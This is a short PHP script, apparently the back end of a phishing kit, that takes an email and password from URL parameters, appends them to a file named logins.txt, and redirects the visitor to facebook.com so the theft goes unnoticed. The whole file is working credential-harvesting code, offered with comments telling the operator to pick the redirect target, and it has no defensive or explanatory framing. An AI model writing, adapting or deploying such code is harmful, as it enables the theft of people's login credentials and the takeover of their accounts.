
<?php

			session_start();
			
			$email=$_GET["email"];
			$pass = $_GET["pass"];
			
			
			//opening logins text file for appending new data.
  			$file = fopen("logins.txt", "a") or die("Unable to open file!");
			
  			//Writing email and password to logins.txt. 
  			fwrite($file, $email.">".$pass.PHP_EOL);			
  			fclose($file);//closing logins.txt.
			
  			//change the location url to redirect to a website of your choice.
  			header("Location: https://www.facebook.com");
			exit();
			
			session_destroy();
			

?>
